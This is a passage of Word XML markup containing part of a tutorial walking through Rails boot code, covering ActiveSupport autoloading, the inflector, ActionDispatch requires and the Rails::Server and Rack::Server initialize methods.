        </w:rPr>
        <w:t>active_support</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A75F54" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E00EC9C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file begins with requiring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/lib/active_support/dependencies/autoload.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which redefines Ruby’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>autoload</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method to have a little more extra behaviour especially in regards to eager autoloading. Eager autoloading is the loading of all required classes and will happen when the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> setting is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The required file also requires another file: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/lazy_load_hooks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1482075F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/lazy_load_hooks.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B619429" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport.on_load</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hook which is used to execute code when specific parts are loaded. We’ll see this in use a little later on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497DE221" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file begins with requiring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/inflector/methods</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D58E1C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/inflector/methods.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DA8EAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>methods.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file is responsible for defining methods such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>dasherize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as well as a slew of others. The </w:t>
      </w:r>
      <w:hyperlink r:id="rId1072" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveSupport::Inflector</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> covers them all pretty decently.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA02E3B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In this file there are a lot of lines such as this inside the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="58F2CED9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="681A6DCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1953977014"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>autoload :Inflector</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75F64D52" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Due to the overriding of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>autoload</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method, Ruby will know how to look for this file at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/inflector.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Inflector</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is first referenced.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0501319D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/lib/active_support/version.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that is also required here simply defines an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::VERSION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant which defines a couple of constants inside this module, the main constant of this is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::VERSION::STRING</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which returns the current version of ActiveSupport.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D8FA07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/lib/active_support.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file simply defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module and some autoloads (eager and of the normal variety) for it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FC958B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>actionpack/lib/action_dispatch.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cont’d.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C01B568" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_pack/lib/action_dispatch.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The next </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in this file is one for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_pack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which simply calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_pack/version.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionPack::VERSION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the constants, much like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSpport</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> does.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689954A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After this line, there’s a require to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which simply defines autoloads for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveModel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> part of Rails and sets up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveModel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module which is used later on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D51B73A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The last of the requires is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which like the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requires before it, sets up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module as well as the autoloads for constants within it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EF1220" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Finally in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> autoloads are declared.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4897183C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/commands/server.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6789A1FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is defined in this file as inheriting from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. When </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Server.new</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is called, this calls the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/commands/server.rb</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0AD9AAFD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26187234" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initialize(*)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12E20212" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  super</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03762377" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  set_environment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="663B452D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B816501" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Firstly, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>super</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is called which calls the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0CC0F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.12 Rack: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/rack/server.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A528E68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is responsible for providing a common server interface for all Rack-based applications, which Rails is now a part of.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2DEFBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> simply sets a couple of variables:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6095"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="731E3CED" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39531C33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initialize(options = nil)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="446D91CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @options</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A7ED43D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @app</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= options[:app] if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options &amp;&amp; options[:app]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EA10A8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A144668" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In this case, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so nothing happens in this method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DDFCCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>super</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has finished in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, we jump back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/commands/server.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. At this point, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>set_environment</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is called within the context of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object and this method doesn’t appear to do much at first glance:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="505F3002" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D37B8A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set_environment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DB3043B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ENV["RAILS_ENV"] ||= options[:environment]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67B61C0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
